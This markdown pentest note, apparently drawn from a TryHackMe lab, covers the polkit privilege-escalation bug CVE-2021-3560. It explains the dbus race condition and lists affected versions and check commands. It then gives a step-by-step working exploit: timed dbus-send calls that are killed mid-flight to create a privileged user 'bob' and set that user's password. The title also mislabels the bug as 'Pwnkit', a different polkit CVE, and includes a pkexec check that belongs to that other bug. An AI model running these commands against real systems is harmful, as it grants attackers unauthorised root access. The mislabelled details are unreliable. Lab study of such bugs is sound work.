# Pwnkit - CVE-2021-3560

Local Privilege Escalation in the package Polkit which is installed by default on almost every major distribution of the Linux operating system.

## Polkit 


Polkit is part of the Linux authorisation system. It providing a granular system with which to assign permissions to users.

## Vulnerability

The exploit is in 6 steps:

1. The attacker manually sends a dbus message to the accounts-daemon requesting the creation of a new account with sudo permissions (or latterly, a password to be set for the new user). This message gets given a unique ID by the dbus-daemon.
2. The attacker kills the message after polkit receives it, but before polkit has a chance to process the message. This effectively destroys the unique message ID.
3. Polkit asks the dbus-daemon for the user ID of the user who sent the message, referencing the (now deleted) message ID.
4. The dbus-daemon can't find the message ID because we killed it in step two. It handles the error by responding with an error code.
5. Polkit mishandles the error and substitutes in 0 for the user ID -- i.e. the root account of the machine.
6. Thinking that the root user requested the action, polkit allows the request to go through unchallenged.

### Version 


|OS|Release|Version|
|-|-|-|
|**Ubuntu**|20.04 LTS (Focal Fossa)|polkit >=  0.105-26ubuntu1.1|
||21.04 (Hirsute Hippo)|polkit >= 0.105-30ubuntu0.1|
||21.10 (Impish Indri)|polkit >= 0.105-31|
|**Debian**|9 stretch|polkit >= 0.105-18+deb9u1|
||9 stretch (security)|polkit >= 0.105-18+deb9u2|
||10 buster|polkit >= 0.105-25|
||10 buster (security)|polkit >= 0.105-25+deb10u1|
||11 bullseye|polkit >= 0.105-31|
||11 bullseye (security)|polkit >= 0.105-31+deb11u1|
||12 bookworm, sid|polkit >= 0.105-31.1|
|**SUSE**|HPE Helion Openstack 8|polkit >= 0.113-5.21.1|
||HPE Helion Openstack 8|polkit >= 0.113-5.21.1|
||SUSE CaaS Platform 4.0|polkit >= 0.114-3.12.1|
||SUSE Enterprise Storage 6|polkit >= 0.114-3.12.1|
||openSUSE Leap 15.2|polkit >= 0.116-lp152.2.3.1|
||openSUSE Leap 15.3|polkit >= 0.116-3.3.1|
|**Fedora**| |polkit >= 0.117-3.fc34.1|
| | |polkit >= 0.117-2.fc33.1|

Command:

```sh
pacman -Q polkit
apt list --installed | grep policykit
rpm -qa polkit
```

### Check SUID

```sh
ls -la $(which pkexec)
```

### Check Version

```sh
pkexec --version
```

## Exploit 

1. Get time to send a dbus message to the accounts daemon
    ```sh
    time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:bob string:"Bob Account" int32:1 2>/dev/null
    ```

2. Divide the 'real time by 2' and then kill it
    ```sh
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:bob string:"Bob Account" int32:1 & sleep 0.005s; kill $!
    ```

    Check if user created:

    ```sh
    id bob
    ```
3. Set the a password for the newly created user
    
    3.1. Create password hash 

    ```sh
    openssl passwd -6 USER_PASSWORD
    ```
    3.2. Set the password for the user (Add the `UID` and `PASSWORD_HASH`)

    ```sh
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/UserUID org.freedesktop.Accounts.User.SetPassword string:'PASSWORD_HASH' string:'Ask the pentester' & sleep 0.005s; kill $!
    ```

# Source 
- https://tryhackme.com/room/polkit
- https://access.redhat.com/security/cve/cve-2021-3560
- https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
- https://ubuntu.com/security/CVE-2021-3560
- https://security-tracker.debian.org/tracker/CVE-2021-3560
- https://bugzilla.redhat.com/show_bug.cgi?id=1967424
